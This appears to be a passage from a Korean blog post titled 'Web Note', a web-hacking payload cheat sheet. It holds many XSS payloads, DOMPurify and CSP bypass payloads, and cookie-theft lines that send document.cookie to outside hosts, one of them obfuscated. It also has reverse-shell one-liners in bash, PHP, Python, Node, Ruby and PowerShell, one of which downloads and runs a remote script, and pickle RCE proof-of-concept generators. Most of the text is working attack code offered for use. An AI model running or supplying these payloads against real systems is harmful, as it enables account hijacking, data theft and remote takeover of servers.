class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span><strong> Use an accepted domain</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure>
+<p><strong>위와 같이 나 자신과 특정(<a target="_blank" rel="noopener" href="http://141.164.52.207/">http://141.164.52.207</a>) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</strong><br><br></p>
+<p><span style="color:#21C587">&#35;</span><strong> Header Injection</strong><br></p>
+<p><strong>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</strong><br><br></p>
+<p><span style="color:#21C587">&#35;</span><strong> AngularJS xss</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>만약 위와 같이 <code>cdnjs.cloudflare.com</code>와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</strong><br></p>
+<p><span style="color:#21C587">&#35;</span><strong> CSP Option ↔ Bypass</strong><br></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure>
+<p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure>
+<hr>
+<p><em>Reference</em> : <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a target="_blank" rel="noopener" href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a></p>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects_url">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess"><span class="toc-number">1.</span> <span class="toc-text">.htaccess
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-Function"><span class="toc-number">2.</span> <span class="toc-text">Upload Function
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-Original"><span class="toc-number">3.</span> <span class="toc-text">XXE (Original)
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE-feat-svg"><span class="toc-number">4.</span> <span class="toc-text">XXE (feat svg)
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">5.</span> <span class="toc-text">XSS
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOMPurify-Bypass"><span class="toc-number">6.</span> <span class="toc-text">DOMPurify Bypass
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">7.</span> <span class="toc-text">CSP Bypass
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse-Shell"><span class="toc-number">8.</span> <span class="toc-text">Reverse Shell
+</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Pickle-RCE-PoC"><span class="toc-number">9.</span> <span class="toc-text">Python Pickle RCE PoC
+</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/01/15/2021-01-15-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/01/15/2021-01-15-note/&text=Web Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/01/15/2021-01-15-note/&is_video=false&description=Web Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Web Note&body=Check out this article: http://example.com/2021/01/15/2021-01-15-note/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/01/15/2021-01-15-note/&title=Web Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/01/15/2021-01-15-note/&name=Web Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/01/15/2021-01-15-note/&t=Web Note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
